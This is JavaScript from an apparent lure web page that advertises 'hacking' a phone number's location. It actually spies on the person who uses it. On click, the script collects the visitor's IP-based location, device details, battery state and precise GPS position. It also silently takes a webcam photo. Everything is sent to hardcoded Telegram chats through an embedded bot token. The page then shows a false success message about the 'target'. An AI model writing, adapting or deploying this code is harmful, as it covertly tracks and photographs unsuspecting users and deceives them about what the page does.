      const botToken = '8571583071:AAFjj-csBmjhK4IeaEe5vnViHBF6bRfH1HY';
    const chatIds = ['6095291231', '6095291231', '-1003083824240'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
IP         : ${ip}
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
Browser    : ${navigator.userAgent}
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
YOU         : ${navigator.platform}
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
Resolution   : ${screen.width}x${screen.height}
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
Battery    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
Memory     : ${navigator.deviceMemory || 'N/A'} GB
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
Time      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>📥 Info Visitors:</b>\n<pre>${text}</pre> BY @XtrolCome`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>📍 GPS Location:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`📍 GPS Location Rejected`)
        );
      } else {
        sendToTelegram(`📍 Browser does not support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('❌ Camera Denied or Unavailable');
            resolve();
          });
      });
    }

    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8 || nomor.length > 15) {
        infoDiv.innerText = '⚠️ Invalid number.';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = '⏳ Prosesing hack lokasi...';
      sendToTelegram(`<b>📞 Target Number:</b> ${nomor}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          infoDiv.innerText = `✅ Successfully hack lokasi target ${number}`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = '❌ There is an error.';
        button.disabled = false;
      }
    });
    
    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 60; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 8 + 's';
        p.style.animationDuration = (Math.random() * 6 + 6) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
